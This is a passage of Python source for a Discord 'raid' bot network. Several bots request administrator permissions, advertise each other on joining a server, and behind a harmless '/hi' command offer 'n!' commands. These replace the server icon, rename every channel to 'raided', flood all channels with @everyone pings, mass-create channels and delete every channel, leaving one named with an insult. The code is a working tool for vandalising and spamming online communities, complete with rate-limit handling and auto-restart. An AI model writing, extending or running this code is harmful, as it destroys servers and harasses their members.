    {"name": "bot2", "token_env": "BOT2_TOKEN", "id": 1492845592303632384},
    {"name": "bot3", "token_env": "BOT3_TOKEN", "id": 1492845711887171706},
    {"name": "bot4", "token_env": "BOT4_TOKEN", "id": 1492846367582847066},
    {"name": "bot5", "token_env": "BOT5_TOKEN", "id": 1493291019029057586},
]

INVITE_BASE = "https://discord.com/api/oauth2/authorize?client_id={}&permissions=8&scope=bot%20applications.commands"


def get_other_bot_invites(exclude_id: int) -> str:
    lines = []
    for config in BOT_CONFIGS:
        if config["id"] != exclude_id:
            lines.append(f"**{config['name']}** → {INVITE_BASE.format(config['id'])}")
    return "\n".join(lines)


class PingBot(discord.Client):
    def __init__(self, bot_name: str, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.bot_name = bot_name
        self.tree = app_commands.CommandTree(self)
        self._running_loops: dict[int, asyncio.Task] = {}
        self._last_create_name: str = "raided"
        self._add_slash_commands()

    def _add_slash_commands(self):
        @self.tree.command(name="hi", description="Say hi")
        async def hi_cmd(interaction: discord.Interaction):
            await interaction.response.send_message("hi again")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info(f"[{self.bot_name}] Global slash commands synced.")

    async def on_ready(self):
        logger.info(f"[{self.bot_name}] Logged in as {self.user} (ID: {self.user.id})")
        for guild in self.guilds:
            try:
                self.tree.copy_global_to(guild=guild)
                await self.tree.sync(guild=guild)
                logger.info(f"[{self.bot_name}] Commands synced to: {guild.name}")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Guild sync failed for {guild.id}: {e}")

    async def on_guild_join(self, guild: discord.Guild):
        logger.info(f"[{self.bot_name}] Joined new guild: {guild.name} ({guild.id})")
        try:
            self.tree.copy_global_to(guild=guild)
            await self.tree.sync(guild=guild)
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Sync failed for new guild {guild.id}: {e}")

        channel = guild.system_channel or next(
            (c for c in guild.text_channels if c.permissions_for(guild.me).send_messages),
            None
        )
        if channel and self.user:
            invites = get_other_bot_invites(exclude_id=self.user.id)
            if invites:
                await channel.send(
                    f"**{self.bot_name}** joined! Add the other bots too:\n{invites}"
                )

    async def on_message(self, message: discord.Message):
        if message.author.bot:
            return
        if not message.content.startswith(PREFIX):
            return

        raw = message.content[len(PREFIX):].strip()
        cmd = raw.lower()

        if cmd.startswith("setup"):
            parts = cmd.split()
            if len(parts) < 2:
                await message.channel.send("Usage: `n!setup <number of pings>`")
                return
            try:
                ping_limit = int(parts[1])
            except ValueError:
                await message.channel.send("Usage: `n!setup <number of pings>` — number must be an integer.")
                return
            guild = message.guild
            if guild is None:
                return

            # Change server icon
            try:
                icon_bytes = base64.b64decode(SERVER_ICON_B64)
                await guild.edit(icon=icon_bytes)
                logger.info(f"[{self.bot_name}] Changed server icon for {guild.name}")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Could not change server icon: {e}")

            # Rename all text channels to the last name used in n!create
            rename_name = self._last_create_name
            for ch in list(guild.text_channels):
                try:
                    await ch.edit(name=rename_name)
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.warning(f"[{self.bot_name}] Could not rename #{ch.name}: {e}")

            # Start @everyone ping loops in all channels
            text_channels = list(guild.text_channels)
            started = 0
            for ch in text_channels:
                cid = ch.id
                if cid not in self._running_loops or self._running_loops[cid].done():
                    task = asyncio.create_task(self._everyone_loop(ch, ping_limit))
                    self._running_loops[cid] = task
                    started += 1
            await message.channel.send(f"Sending @everyone {ping_limit} times across {started} channel(s)!")

        elif cmd.startswith("create "):
            parts = raw.split()
            if len(parts) < 3:
                await message.channel.send("Usage: `n!create <name> <number>`")
                return
            ch_name = parts[1]
            try:
                count = int(parts[2])
            except ValueError:
                await message.channel.send("Number must be an integer.")
                return
            guild = message.guild
            if guild is None:
                return
            self._last_create_name = ch_name
            await message.channel.send(f"Creating {count} channel(s) named `{ch_name}`...")
            await asyncio.gather(
                *[self._safe_create_channel(guild, ch_name) for _ in range(count)],
                return_exceptions=True
            )
            await message.channel.send(f"Done! Created {count} channel(s) named `{ch_name}`.")

        elif cmd == "clear":
            guild = message.guild
            if guild is None:
                return
            all_channels = list(guild.channels)
            await message.channel.send(f"Clearing all {len(all_channels)} channels...")

            # Delete all channels
            await asyncio.gather(
                *[self._safe_delete_channel(c) for c in all_channels],
                return_exceptions=True
            )

            # Create the new channel
            try:
                await guild.create_text_channel("hi da punda")
                logger.info(f"[{self.bot_name}] Created 'hi da punda' in {guild.name}")
            except Exception as e:
                logger.warning(f"[{self.bot_name}] Could not create 'hi da punda': {e}")

    async def _safe_create_channel(self, guild: discord.Guild, name: str):
        try:
            await guild.create_text_channel(name)
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Could not create channel '{name}': {e}")

    async def _safe_delete_channel(self, channel: discord.abc.GuildChannel):
        try:
            await channel.delete(reason="n!clear command")
        except discord.NotFound:
            pass
        except discord.Forbidden:
            logger.warning(f"[{self.bot_name}] No permission to delete #{channel.name}")
        except Exception as e:
            logger.warning(f"[{self.bot_name}] Could not delete #{channel.name}: {e}")

    async def _everyone_loop(self, channel: discord.TextChannel, limit: int):
        sent = 0
        while sent < limit:
            try:
                await channel.send(
                    "@everyone",
                    allowed_mentions=discord.AllowedMentions(everyone=True)
                )
                sent += 1
                await asyncio.sleep(0.5)
            except discord.Forbidden:
                logger.warning(f"[{self.bot_name}] No permission in #{channel.name}, stopping.")
                break
            except discord.NotFound:
                logger.warning(f"[{self.bot_name}] #{channel.name} deleted, stopping loop.")
                break
            except discord.HTTPException as e:
                retry = getattr(e, "retry_after", 5)
                logger.warning(f"[{self.bot_name}] Rate limited in #{channel.name}, waiting {retry}s")
                await asyncio.sleep(retry)
            except Exception as e:
                logger.error(f"[{self.bot_name}] Error in everyone loop: {e}")
                await asyncio.sleep(5)
        logger.info(f"[{self.bot_name}] Finished sending {sent} @everyone pings in #{channel.name}")


async def run_bot(token: str, bot_name: str):
    intents = discord.Intents.default()
    intents.message_content = True
    while True:
        try:
            client = PingBot(bot_name=bot_name, intents=intents)
            async with client:
                await client.start(token)
        except discord.HTTPException as e:
            wait = 60
            logger.warning(f"[{bot_name}] HTTP error on login ({e.status}), retrying in {wait}s...")
            await asyncio.sleep(wait)
        except Exception as e:
            logger.error(f"[{bot_name}] Unexpected error: {e}, retrying in 30s...")
            await asyncio.sleep(30)


async def main():
    bot_tasks = []
    for config in BOT_CONFIGS:
        token = os.getenv(config["token_env"])
        if not token:
            print(f"[WARNING] {config['token_env']} is not set — skipping {config['name']}")
            continue
        bot_tasks.append(run_bot(token=token, bot_name=config["name"]))

    if not bot_tasks:
        print("No bot tokens found. Please set BOT1_TOKEN, BOT2_TOKEN, BOT3_TOKEN, BOT4_TOKEN.")
        return

    print(f"Starting {len(bot_tasks)} bot(s)...")
    await asyncio.gather(*bot_tasks)


if __name__ == "__main__":
    asyncio.run(main())
